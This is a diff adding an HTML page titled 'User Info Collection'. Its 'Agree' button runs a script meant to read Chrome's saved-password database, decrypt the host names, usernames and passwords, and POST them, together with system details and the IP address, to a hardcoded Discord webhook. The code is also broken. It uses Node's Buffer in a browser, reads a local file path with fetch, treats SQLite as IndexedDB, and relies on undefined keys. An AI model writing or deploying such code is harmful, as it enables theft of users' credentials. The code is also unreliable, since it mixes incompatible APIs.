@@ -1,1 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>User Info Collection</title>
+</head>
+<body>
+  <h1>User Info Collection</h1>
+  <p>Please read the following information and click "Agree" to share your data:</p>
+  <button id="agree-btn">Agree</button>
+
+  <script>
+    const DB_PATH = 'Google/Chrome/User Data/Default/Login Data';
+    const NONCE_BYTE_SIZE = 12;
+
+    function encrypt(cipher, plaintext, nonce) {
+      cipher.setAAD(new Uint8Array());
+      cipher.setNonce(nonce);
+      const ciphertext = cipher.update(plaintext);
+      cipher.final();
+      return { cipher, ciphertext, nonce };
+    }
+
+    function decrypt(cipher, ciphertext, nonce) {
+      cipher.setAAD(new Uint8Array());
+      cipher.setNonce(nonce);
+      const decrypted = cipher.update(ciphertext);
+      cipher.final();
+      return decrypted;
+    }
+
+    function getCipher(key) {
+      const algorithm = 'aes-256-gcm';
+      const cipher = crypto.subtle.importKey('raw', key, algorithm, false, ['encrypt', 'decrypt']);
+      return cipher;
+    }
+
+    async function dpapiDecrypt(encrypted) {
+      const dataBlobIn = new Uint8Array(Buffer.from(encrypted, 'hex'));
+      const dataBlobOut = await window.crypto.subtle.decrypt({ name: 'RSA-OAEP' }, privateKey, dataBlobIn);
+      return new TextDecoder().decode(dataBlobOut);
+    }
+
+    function unixDecrypt(encrypted) {
+      const password = 'peanuts';
+      const iterations = 1;
+
+      const salt = new TextEncoder().encode('saltysalt');
+      const iv = new Uint8Array(16);
+      const length = 16;
+
+      const keyMaterial = window.crypto.subtle.importKey('raw', new TextEncoder().encode(password), { name: 'PBKDF2' }, false, ['deriveBits']);
+      const key = window.crypto.subtle.deriveBits({ name: 'PBKDF2', salt, iterations, hash: 'SHA-1' }, keyMaterial, length * 8);
+      const cipher = window.crypto.subtle.importKey('raw', key, 'AES-CBC', false, ['decrypt']);
+      
+      const decrypted = window.crypto.subtle.decrypt({ name: 'AES-CBC', iv }, cipher, encrypted);
+      return new TextDecoder().decode(decrypted.slice(0, -decrypted[decrypted.length - 1]));
+    }
+
+    async function aesDecrypt(encryptedTxt) {
+      const encodedKey = await getKeyFromLocalState();
+      const encryptedKey = new Uint8Array(Buffer.from(encodedKey, 'hex'));
+      const nonce = encryptedTxt.slice(3, 15);
+      const ciphertext = encryptedTxt.slice(15);
+
+      const cipher = await getCipher(encryptedKey);
+      const decrypted = await decrypt(cipher, ciphertext, nonce);
+      return new TextDecoder().decode(decrypted);
+    }
+
+    class ChromePassword {
+      constructor() {
+        this.passwordList = [];
+      }
+
+      async getChromeDB() {
+        const response = await fetch(DB_PATH);
+        const dbFile = await response.arrayBuffer();
+        const tempPath = 'sqlite_file';
+
+        const dbData = new Uint8Array(dbFile);
+        const blob = new Blob([dbData], { type: 'application/octet-stream' });
+        const url = URL.createObjectURL(blob);
+
+        this.showPasswords(url);
+      }
+
+      async showPasswords(dbFile) {
+        const db = await openDB(dbFile);
+        const transaction = db.transaction('logins', 'readonly');
+        const objectStore = transaction.objectStore('logins');
+
+        const rows = await objectStore.getAll();
+        for (const row of rows) {
+          const host = row.signon_realm;
+          if (host.startsWith('android')) {
+            continue;
+          }
+          const name = row.username_value;
+          const value = await this.chromeDecrypt(row.password_value);
+          const info = `Hostname: ${host}\nUsername: ${name}\nPassword: ${value}\n\n`;
+          this.passwordList.push(info);
+        }
+
+        await transaction.done;
+        db.close();
+        this.sendToDiscord();
+      }
+
+      async chromeDecrypt(encryptedTxt) {
+        try {
+          if (encryptedTxt.slice(0, 8) === '01000000') {
+            const decryptedTxt = await dpapiDecrypt(encryptedTxt);
+            return decryptedTxt;
+          } else if (encryptedTxt.slice(0, 2) === 'v10') {
+            const decryptedTxt = await aesDecrypt(encryptedTxt);
+            return decryptedTxt.slice(0, -16);
+          }
+        } catch (err) {
+          return null;
+        }
+      }
+
+      async sendToDiscord() {
+        const systemInfo = {
+          'GPU': navigator.gpu ? navigator.gpu.renderer : 'Not available',
+          'Operating System': navigator.platform || 'Unknown',
+          'Geolocation': navigator.geolocation ? 'Available' : 'Not available',
+          'Battery Level': navigator.getBattery ? 'Unknown' : 'Not supported',
+          'CPU Cores': navigator.hardwareConcurrency || 'Unknown',
+          'Browser': navigator.userAgent || 'Unknown',
+          'Language': navigator.language || 'Unknown',
+          'IP Address': await getIpAddress(),
+          'Screen Resolution': `${window.screen.width}x${window.screen.height}`,
+          'Available Screen Height': window.screen.availHeight || 'Unknown',
+          'Available Screen Width': window.screen.availWidth || 'Unknown',
+          'Device Memory': navigator.deviceMemory || 'Unknown'
+        };
+
+        const data = {
+          'Chrome Passwords': this.passwordList,
+          'System Info': systemInfo
+        };
+
+        try {
+          await fetch('https://discord.com/api/webhooks/1126968076265586738/uGcrKIl0KSrDZ0WoN7fujx-46n4d_T7F7EQLdBtxLIhFH_jGq7X8BPbnZYr0Shc2J_tc', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+          });
+
+          console.log('User information sent to Discord webhook successfully.');
+        } catch (err) {
+          console.error('Failed to send user information to Discord webhook:', err);
+        }
+      }
+    }
+
+    async function getIpAddress() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (error) {
+        console.error('Failed to retrieve IP address:', error);
+        return 'Unknown';
+      }
+    }
+
+    function captureUserInfo() {
+      const main = new ChromePassword();
+      main.getChromeDB();
+    }
+
+    // Add event listener to agreement button
+    document.getElementById('agree-btn').addEventListener('click', captureUserInfo);
+  </script>
+</body>
+</html>
 
